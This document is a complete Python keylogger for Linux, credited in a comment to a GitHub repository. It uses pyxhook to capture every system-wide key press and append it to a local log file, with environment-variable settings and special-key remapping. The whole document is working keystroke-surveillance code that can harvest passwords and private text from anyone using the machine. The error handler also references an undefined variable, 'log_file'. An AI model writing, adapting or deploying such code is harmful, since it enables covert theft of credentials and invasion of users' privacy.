#!/usr/bin/python3
# From: https://github.com/nandydark/Linux-keylogger
import os
import pyxhook
  
l_file = os.environ.get(
    'pylogger_file',
    os.path.expanduser('Keylog.txt')
)

cancel_key = ord(
    os.environ.get(
        'pylogger_cancel',
        '`'
    )[0]
)
  
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(l_file)
    except EnvironmentError:
       # File does not exist, or no permissions.
        pass
  

def OnKeyPress(event):
    with open(l_file, 'a') as k:
        if event.Key == 'Return':
            k.write('\n')
        elif event.Key == 'Delete':
            k.write('Supr')
        elif event.Key == 'BackSpace':
            k.write('Del')
        elif event.Key == 'at':
            k.write('@')
        elif event.Key == 'exclam':
            k.write('!')
        elif event.Key == 'period':
            k.write('.')
        elif event.Key == 'comma':
            k.write(',')
        elif event.Key == 'colon':
            k.write(':')
        elif event.Key == 'semicolon':
            k.write(';')
        elif event.Key == 'parenright':
            k.write(')')
        elif event.Key == 'parenleft':
            k.write('(')
        elif event.Key == 'equal':
            k.write('=')
        elif event.Key == 'space':
            k.write(' ')
        elif event.Key == 'odiaeresis':
            k.write('ö')
        elif event.Key == 'adiaeresis':
            k.write('ä')
        elif event.Key == 'udiaeresis':
            k.write('ü')
        elif event.Key == 'numbersign':
            k.write('#')
        elif event.Key == 'ssharp':
            k.write('ß')            
        elif event.Key == 'Super_R':
            pass
        elif event.Key == 'Super_L':
            pass
        elif event.Key == 'Shift_R':
            pass
        elif event.Key == 'Shift_L':
            pass
        elif event.Key == 'Control_L':
            pass
        elif event.Key == 'Control_R':
            pass
        elif event.Key == 'Alt_L':
            pass
        elif event.Key == 'Caps_Lock':
            pass
        elif event.Key == '[65027]':
            pass
        else:
            k.write('{}'.format(event.Key))
  

new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
new_hook.HookKeyboard()
try:
    new_hook.start()
except KeyboardInterrupt:
    pass
except Exception as ex:
    msg = 'Error while catching events:  {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as k:
        k.write('{}'.format(msg))
